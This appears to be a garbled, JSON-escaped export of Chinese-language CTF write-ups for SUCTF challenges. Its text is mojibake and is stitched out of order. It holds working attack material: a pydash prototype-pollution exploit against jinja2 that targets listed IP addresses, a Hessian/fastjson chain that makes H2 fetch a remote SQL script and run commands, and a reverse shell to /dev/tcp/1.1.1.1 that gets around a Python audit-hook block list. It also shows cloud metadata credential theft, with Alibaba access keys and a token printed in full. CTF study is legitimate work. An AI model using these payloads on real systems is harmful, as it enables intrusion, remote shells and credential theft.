@app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) 